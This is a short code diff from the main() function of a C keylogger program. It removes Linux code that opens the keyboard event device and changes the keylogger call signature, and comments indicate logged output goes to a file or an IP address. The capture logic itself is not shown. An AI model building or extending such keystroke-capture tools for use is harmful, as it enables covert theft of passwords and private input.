@@ -23,10 +23,6 @@ int main(int argc, char *argv[]) {
     // output file descriptor
     FILE* writeout;
 
-    // keyboard file descriptor
-    // only for linux usage
-    int keyboard = 0;
-
     // option value
     // file path or ip address
     const char *option_input = parse_options(argc, argv);
@@ -57,20 +53,7 @@ int main(int argc, char *argv[]) {
         #endif
     }
 
-    #if defined(PLATFORM_LINUX)
-
-    char *KEYBOARD_DEVICE = get_keyboard_event_file();
-    if(!KEYBOARD_DEVICE){
-        print_usage_and_quit(argv[0]);
-    }
-
-    if((keyboard = open(KEYBOARD_DEVICE, O_RDONLY)) < 0){
-        printf("Error accessing keyboard from %s. May require you to be superuser\n", KEYBOARD_DEVICE);
-        return 1;
-    }
-    #endif
-
-    keylogger(keyboard, writeout);
+    keylogger(writeout);
     fclose(writeout);
 
 }
